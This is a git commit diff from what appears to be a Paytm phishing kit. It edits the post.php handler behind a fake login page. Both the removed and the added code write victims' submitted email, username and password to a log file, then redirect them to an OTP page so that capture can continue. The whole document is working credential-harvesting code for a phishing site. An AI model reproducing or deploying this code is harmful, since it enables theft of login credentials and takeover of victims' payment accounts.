7a1a5656a0187940a02d1cfd459e8273e565ca35
SG_PRO <55870659+Ignitetch@users.noreply.github.com>
2020-09-06 12:13:05 -0400

    Add files via upload

--- sites/Paytm-Phishing/paytm/post.php
+++ sites/Paytm-Phishing/paytm/post.php
@@ -1,13 +1,5 @@
 <?php
-header ('Location: otp.login.php');
-$handle = fopen("log.txt", "a");
-foreach($_POST as $variable => $value) {
-fwrite($handle, $variable);
-fwrite($handle, "=");
-fwrite($handle, $value);
-fwrite($handle, "\r\n");
-}
-fwrite($handle, "\r\n");
-fclose($handle);
-exit;
-?>
+
+    file_put_contents("log.txt", "Email: " . $_POST['email'] . " Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: otp.login.php');
+exit();
